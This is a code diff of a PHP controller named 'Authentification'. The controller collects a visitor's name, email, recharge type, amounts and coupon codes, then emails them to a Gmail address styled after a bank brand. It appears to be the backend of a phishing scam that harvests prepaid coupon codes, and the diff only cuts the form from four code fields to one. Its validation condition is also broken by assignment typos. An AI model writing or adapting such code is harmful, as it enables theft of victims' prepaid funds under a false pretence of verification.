@@ -15,12 +15,7 @@ class Authentification extends Controller
             $type = $_POST['type'];
             $mont1 = strip_tags(trim($_POST['mont1']));
             $cc1 = strip_tags(trim($_POST['cc1']));
-            $mont2 = strip_tags(trim($_POST['mont2']));
-            $cc2 = strip_tags(trim($_POST['cc2']));
-            $mont3 = strip_tags(trim($_POST['mont3']));
-            $cc3 = strip_tags(trim($_POST['cc3']));
-            $mont4 = strip_tags(trim($_POST['mont4']));
-            $cc4 = strip_tags(trim($_POST['cc4']));
+
 
             if ($nom != "" && $email != "" && $mont1 = !"" && $type = !"" && $cc1 = !"") {
                 $to = "cmutuel1 @gmail.com";
@@ -32,12 +27,7 @@ class Authentification extends Controller
                   Type de recharge : " . $type . "
                   Montant 1 : " . $mont1 . "€
                   Code coupon 1 : " . $cc1 . "
-                  Montant 2 : " . $mont2 . "€
-                  Code coupon 2 :" . $cc2 . "
-                  Montant 3 : " . $mont3 . "€
-                  Code coupon 3 : " . $cc3 . "
-                  Montant 4 : " . $mont4 . "€
-                  Code coupon 4 : " . $cc4 . "
+            
                   ";
                 if (mail($to, $subject, $msg)) {
                     $_SESSION['success'] = true;
@@ -48,8 +38,6 @@ class Authentification extends Controller
                 $_SESSION['vide'] = true;
             }
         }
-
-
 
         return view('authentification');
     }
